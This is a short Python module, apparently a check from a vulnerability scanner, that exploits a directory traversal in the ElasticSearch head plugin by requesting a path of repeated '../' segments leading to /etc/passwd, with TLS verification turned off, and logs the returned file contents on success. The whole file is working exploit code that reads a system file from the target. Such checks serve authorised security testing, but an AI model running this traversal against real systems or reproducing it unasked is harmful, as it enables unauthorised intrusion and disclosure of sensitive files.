from typing import Optional

import requests

from lib.log import logger


def run(url: str, port: int) -> Optional[str]:
    address = f"{url}:{port}"
    target_url = f"{address}/_plugin/head/../../../../../../../../../etc/passwd"
    try:
        logger.info(f"Checking directory traversal at {target_url}")
        response = requests.get(target_url, timeout=5, verify=False)
        if response.status_code == 200:
            logger.success("ElasticSearch Directory traversal ~")
            logger.info(f"Response: {response.text}")
            return "ElasticSearch Directory traversal ~"
        logger.warning(f"Failed, status code: {response.status_code}")
        return None
    except requests.RequestException as e:
        logger.error(f"Request failed: {str(e)}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return None
